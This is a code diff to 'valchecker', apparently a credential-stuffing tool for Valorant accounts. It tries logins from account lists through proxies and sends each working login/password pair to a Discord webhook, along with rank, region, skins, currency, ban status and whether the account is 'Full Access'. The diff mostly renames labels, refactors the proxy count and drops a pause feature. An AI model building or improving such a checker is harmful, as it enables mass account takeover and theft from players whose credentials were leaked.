@@ -94,13 +94,9 @@ class simplechecker():
         self.riotlimitinarow=0
         self.count=0
 
-        if self.proxylist != None:
-            self.proxycount=len(proxylist)
-        else:
-            self.proxycount=0
+        self.proxycount=len(proxylist) if self.proxylist != None else 0
 
         self.run=True
-        self.runningtext=f'{Fore.LIGHTGREEN_EX}Running{Fore.RESET}'
 
         self.ranks={'unranked':0,'iron':0,'bronze':0,'silver':0,'gold':0,'platinum':0,'diamond':0,
         'ascendant':0,'immortal':0,'radiant':0,'unknown':0}
@@ -186,14 +182,6 @@ class simplechecker():
         authenticate=auth.auth()
         #self.printinfo()
         while True:
-            #self.printinfo()
-            if self.run==False:
-                self.runningtext=f'{Fore.YELLOW}Paused{reset}'
-                while True:
-                    if keyboard.is_pressed('P'):
-                        self.runningtext=f'{green}Running{reset}'
-                        self.run=True
-                        break
             try:
                 token,entt,uuid,mailverif,banuntil=authenticate.auth(account,proxy=proxy)
                 #token=authenticate.access_token
@@ -427,14 +415,14 @@ class simplechecker():
                             if banuntil!=None:
                                 embed = DiscordEmbed(title='New tempbanned account', color='ff4400')
                                 embed.add_embed_field(name='Ban Until',value=str(banuntil))
-                            embed.set_author(name='valkeker')
+                            embed.set_author(name='ValChecker')
                             embed.set_timestamp()
                             embed.add_embed_field(name='LogPass', value=account)
                             embed.add_embed_field(name='Region', value=f'{reg} ({country})')
                             embed.add_embed_field(name='Rank', value=rank)
                             embed.add_embed_field(name='Level', value=lvl)
                             embed.add_embed_field(name='Lastmatch', value=lastplayed)
-                            embed.add_embed_field(name='Unverifiedmail', value=mailverif)
+                            embed.add_embed_field(name='Full Access', value=mailverif)
                             embed.add_embed_field(name=f'VP / RP', value=f'{vp} / {rp}')
                             embed.add_embed_field(name=f'Skins ({skinscount}) ≈ {invprice} VP',value=skins if skins.replace(' ','').replace('\n','')!='' else 'drugged capybaras')
                             dcwebhook.add_embed(embed)
@@ -443,7 +431,7 @@ class simplechecker():
 
             except Exception as e:
                 #input(e)
-                with open(f'{self.parentpath}/log.txt','a',errors='replace') as f:
+                with open(f'{self.parentpath}/log.txt','a',errors='replace',encoding='utf-8') as f:
                     f.write(f'({datetime.now()}) {str(traceback.format_exc())}\n_________________________________\n')
                 self.err+=1
             self.checked+=1
@@ -472,7 +460,7 @@ class simplechecker():
                 from discord_webhook import DiscordWebhook, DiscordEmbed
                 dcwebhook = DiscordWebhook(url=self.webhook)
                 embed = DiscordEmbed(title='Stats', color='686d75')
-                embed.set_author(name='valkeker')
+                embed.set_author(name='ValChecker')
                 embed.set_timestamp()
                 embed.add_embed_field(name='Checked', value=f'{self.checked}/{self.count}')
                 embed.add_embed_field(name='Valid', value=self.valid)
@@ -499,7 +487,7 @@ class simplechecker():
     {reset}
     {sys.center('https://github.com/LIL-JABA/valchecker')}
 
-    {sys.center(f'Proxies: {cyan}{self.proxycount}{reset} | Threads:  {cyan}{self.threadam}{reset} | Accounts: {cyan}{self.count}{reset} | Checked {Fore.YELLOW}{self.checked}{reset}/{Fore.YELLOW}{self.count}{reset} | {self.runningtext} | {self.whtext}')}
+    {sys.center(f'Proxies: {cyan}{self.proxycount}{reset} | Threads:  {cyan}{self.threadam}{reset} | Accounts: {cyan}{self.count}{reset} | Checked {Fore.YELLOW}{self.checked}{reset}/{Fore.YELLOW}{self.count}{reset} | {self.whtext}')}
                 {sys.progressbar(self.checked,self.count)}
     {reset}
 {cyan} ┏━ Main ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┏━━ Regions ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┏━━ Skins ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
